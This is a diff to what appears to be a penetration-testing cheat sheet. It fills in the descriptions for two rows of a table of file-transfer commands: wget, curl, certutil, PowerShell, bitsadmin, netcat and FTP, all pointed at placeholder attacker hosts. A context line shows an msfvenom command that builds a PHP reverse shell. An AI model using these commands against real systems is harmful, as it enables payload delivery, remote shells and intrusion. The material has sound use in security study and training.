@@ -365,14 +365,14 @@ msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 | wget http://ip-addr:port/file [-o output_file]	| Wget comes preinstalled with most Linux systems |
 | curl http://ip-addr:port/file -o output_file	| Curl comes preinstalled with most Linux and some Windows systems |
 | certutil -urlcache -split -f “http://ip-addr:port/file” output_file	| Certutil is a Windows builtin command line tool |
-| powershell -c Invoke-WebRequest -Uri http://ip-addr:port/file -OutFile output_file; |
+| powershell -c Invoke-WebRequest -Uri http://ip-addr:port/file -OutFile output_file; | Powershell Invoke-WebRequest cmdlet or the System.Net.WebClient class |
 | powershell -c (New-Object Net.WebClient).DownloadFile(‘http://ip-addr:port/file’, ‘output_file’)	| Powershell Invoke-WebRequest cmdlet or the System.Net.WebClient class |
 | bitsadmin /transfer job /download /priority high http://IP_ADDR/file output_file	| Bitsadmin Windows command-line tool |
 | nc -nv IP_ADDR 443 > file	| Netcat command to download files from a Netcat listener |
 | nc -q 0-lvp 443 > file	| Netcat listener to receive files |
 | copy \IP_ADDR\SHARE\output_file	| Copy command to download files from an SMB share |
 | smbget smb://domain;user[:password@]server/share/path/file	| smbget utility to download files from a Samba share |
-| wget ftp://user:password@IP_ADDR/path/file -o output_file |
+| wget ftp://user:password@IP_ADDR/path/file -o output_file | wget stuff via FTP |
 | - FTP | FTP |
 | echo open 192.168.1.64 21> ftp.txt | FTP |
 | echo anonymous>> ftp.txt | FTP |
